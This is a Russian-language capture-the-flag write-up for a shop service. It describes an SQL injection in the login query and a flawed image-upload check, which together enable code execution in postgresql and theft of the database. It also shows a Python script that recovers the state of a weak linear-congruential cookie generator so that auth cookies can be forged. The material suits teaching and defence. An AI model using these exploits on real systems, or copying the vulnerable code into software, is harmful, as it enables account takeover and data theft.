# Первая уязвимость

Бэкэнд сервиса в качестве базы данных использует postgresql. Так как С++ относительно низкоуровневый язык, то сервис не пользуется никакими ORM, 
но всю работу с базой проделывает через сырые запросы с помощью библиотеки [libpq](https://www.postgresql.org/docs/current/libpq.html). Следовательно,
есть поле для разгула SQL инъекций. При этом почти все места, куда можно было бы вставить инъекцию защищены функцией экранирования PQescapeLiteral. Кроме одного места - 
[метода, используемого при авторизации пользователя](../../services/5g_shop/back/internal/src/services/UsersService.cpp#L98):
```cpp
    auto query = Format(
            HiddenStr("select * from users where login='%s' and password_hash=%s;"),
            login.c_str(),
            escapedPasswordHash.c_str()
    );

    result = PQexec(conn, query.c_str());
```

Сюда можно вставлять практически любой SQL запрос, однако на выходе есть [проверка на "количество и качество"](../../services/5g_shop/back/internal/src/services/UsersService.cpp#L105), которая несколько затрудняет 
извлечение данных через простые запросы:
```cpp
    if (PQresultStatus(result) != PGRES_TUPLES_OK || PQntuples(result) != 1) {
        auto msg = std::string(PQresultErrorMessage(result));

        CROW_LOG_ERROR << msg;

        return Result<std::shared_ptr<User>>::ofError("invalid login or password");
    }

    auto user = User::ReadFromPGResult(result);

    if (user->passwordHash != passwordHash || user->login != login) {
        return Result<std::shared_ptr<User>>::ofError("invalid login or password");
    }
```

В то же время, в сервисе есть функционал загрузки картинок, использующихся для "описания" продаваемой техники. Логика проверки того, что загружаемый файл является картинкой, [присутствует](../../services/5g_shop/back/internal/src/main.cpp#L422), однако написана с ошибкой - проверка есть только заголовка и то, только в случае, когда он есть:
```cpp
    for (auto &header: part.headers) {
        if (header.value.first == "Content-Type") {
            if (!header.value.second.starts_with("image")) {
                return response(status::BAD_REQUEST);
            }
        }
        if (header.value.first == "Content-Disposition") {
            filename = header.params["filename"];
        }
    }
```

Поэтому загрузить любой файл не составит труда. К тому же загруженные файлы будут доступны из контейнера postgresql. Поэтому есть вариант использования уязвимости - выполнить произвольный код
в postgresql, нужно только загрузить туда правильный *.so*-файл. Пример реализации можно посмотреть [здесь](./psql-rce)

Как вариант использования rce уязвимости - перезапись существующей картинки файлами postgresql, а затем обычное выкачивание этой "картинки" себе - получает полную копию базы данных любой команды.


# Вторая уязвимость

В сервисе используется самописный генератор uuid4 для кук авторизации пользователей. Генератор основан на линейном конгруэнтном методе, который легко взламывается. [UUID.cpp](services/5g_shop/back/internal/src/tools/UUID.cpp#L14)
```cpp
volatile uint8_t ab[] = {0x41, 0x3c, 0xc6, 0xf3, 0x4e, 0x5f, 0x6d};
volatile uint8_t cb[] = {0x3c, 0x41, 0x6e, 0xc6, 0xf3, 0x6d, 0x5f};
static volatile uint32_t x;
static bool initialized = false;

static char alpha[] = "0123456789abcdef";

namespace shop {
    uint16_t rand() {
        if (!initialized) {
            initialized = true;

            x = std::time(nullptr);
        }

        uint32_t a = (ab[0] << 24) | (ab[2] << 16) | (ab[4] << 8) | ab[6];
        uint32_t c = (cb[0] << 24) | (cb[2] << 16) | (cb[4] << 8) | cb[6];

        x = x * a + c;

        return static_cast<uint16_t>((x & 0xFFFF0000) >> 16);
    }
}
```

Более того, получаемые uuid почти полностью выдают стейт генератора, лишь меняя полубайты местами и выводя сгенерированные числа "в bit endian'e":
```cpp
int counters[] = {4, 2, 2, 8};

    union {
        uint16_t randvalues[8];
        uint8_t bytes[16];
    };

    randvalues[0] = rand();
    randvalues[1] = rand();
    randvalues[2] = rand();
    randvalues[3] = rand();
    randvalues[4] = rand();
    randvalues[5] = rand();
    randvalues[6] = rand();
    randvalues[7] = rand();

    int p = 0;

    for (auto i = 0; i < 4; ++i) {
        for (int j = 0; j < counters[i]; ++j) {
            uint8_t b = bytes[p++];

            ss << alpha[b & 0x0F] << alpha[(b & 0xF0) >> 4];
        }

        if (i != 3) {
            ss << "-";
        }
    }

    return ss.str();
```

Поэтому восстановить состояние можно, создав пользователя и "посмотрев" на его куку. После восстановленного состояния можно генерировать авторизационные куки. Чтобы не перебирать пары (пользователь, кука) можно 
воспользоваться сортировкой всех пользователей по полю `created_at` таковых из метода `/api/users/list`. Код получания состояния генератора может выглядеть [так:](./broken-uuid/sploit.py)
```python
import requests
import uuid


r = requests.post(f'http://localhost:4040/api/users', json={'login': str(uuid.uuid4()), 'password_hash': str(uuid.uuid4()), 'credit_card_info': 'some card'})

if r.status_code != 201:
    print(r, r.content)
    exit(0)


cookie = r.json()['auth_cookie']

print(cookie)

x1 = int(''.join(reversed(cookie[0:4])), 16)
x2 = int(''.join(reversed(cookie[4:8])), 16)

print(hex(x1), hex(x2))

# параметры генератора из бинарника сервиса
a = 0x41c64e6d
c = 0x3c6ef35f

low = 0
lows = []
while low < (1 << 16):
    if ((((low | (x1 << 16)) * a + c) & 0xFFFF0000) >> 16) == x2:
        lows.append(low)
    low += 1


for low in lows:
    x = (x1 << 16) | low
    def rand():
        global x
        x = (x * a + c) & 0xFFFFFFFF
        return (x & 0xFFFF0000) >> 16
    b = [x, rand(), rand(), rand(), rand(), rand(), rand(), rand()]
    s = ''
    for l in b:
        s += ''.join(reversed((hex(l)[2:]).zfill(4)))
    print(x, s)

    if s[4:] == cookie.replace('-', ''):
        print('found! current state is ', x, a, c)
```

